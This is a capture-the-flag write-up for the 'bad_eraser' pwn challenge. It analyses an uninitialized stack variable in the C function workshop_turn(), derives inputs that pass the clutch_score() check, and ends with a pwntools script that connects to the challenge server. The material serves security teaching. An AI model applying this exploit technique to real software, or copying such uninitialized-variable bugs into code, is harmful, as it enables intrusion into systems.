## I. Reconnaissance
- FILE
```D
bad_eraser: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=b74b3556d83720300f4f2aa20803ba5345b5fb70, for GNU/Linux 3.2.0, not stripped
```
- Checksec
```D
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```
## II. Vulnerability Analysis
- By examining the `workshop_turn()` function in the source code, we can identify an Uninitialized Local Variable vulnerability that leads to Data Remanence on the stack.
```C
static void workshop_turn(void) {
    int choice;
    unsigned int mold_id;
    unsigned int pigment_code;

    banner();
    if (scanf("%d", &choice) != 1) {
        exit(0);
    }

    if (choice == 1) {
        preview_brick();
        return;
    }

    if (choice == 2) {
        erase_station();
        return;
    }

    if (choice == 4) {
        puts("Workshop closed. See you next build day.");
        exit(0);
    }

    if (choice != 3) {
        puts("Unknown action. Pick 1-4.");
        return;
    }

    if (!service_initialized) {
        puts("First-time calibration required.");
        puts("Enter mold id and pigment code.");
        if (scanf("%u %u", &mold_id, &pigment_code) != 2) {
            exit(0);
        }

        puts("Calibration saved. Re-enter diagnostics for clutch validation.");
        service_initialized = 1;
        return;
    }

    diagnostics_bay(mold_id, pigment_code);
}
```
- When Option 3 is selected for the first time, the program prompts for `mold_id` and `pigment_code`. The user's input is written directly into the stack memory allocated for these local variables.`service_initialized` is set to 1.
- I suspected that because the program runs in a `while(1)` loop inside `main()`, calling `workshop_turn()` a second time might just create a new stack frame at the exact same memory location as the previous one.
- Since `service_initialized` is now 1, the scanf block is bypassed. The variables `mold_id` and `pigment_code` are never initialized with new values. Consequently, they inherit the exact numbers we inputted during the first run left behind on the stack.
## III. Exploitation Strategy
- To exploit this stack reuse, we need to pass the check inside `diagnostics_bay()`:
  ```C
  if (clutch_score(mold_id, pigment_code) == 0x23ccdu) {
        win();
    }
  ```
- The target hex value `0x23ccd` translates to `146637` in decimal. The `clutch_score` formula is:`(((mold_id >> 2) & 0x43u) | pigment_code) + (pigment_code << 1)`
- We can intentionally set `mold_id = 0` and `pigment_code = 48879` to bypass, so our payload strategy is to seed the stack with `0` and `48879`.
### IV. Exploit Script
```python
from pwn import *
p = remote('bad-eraser-brick-workshop.pwn.ctf.umasscybersec.org', 45002)

p.sendlineafter(b"> ", b"3")
p.sendlineafter(b"mold id and pigment code.\n", b"0 48879")
p.sendlineafter(b"> ", b"3")

p.interactive()
```
  
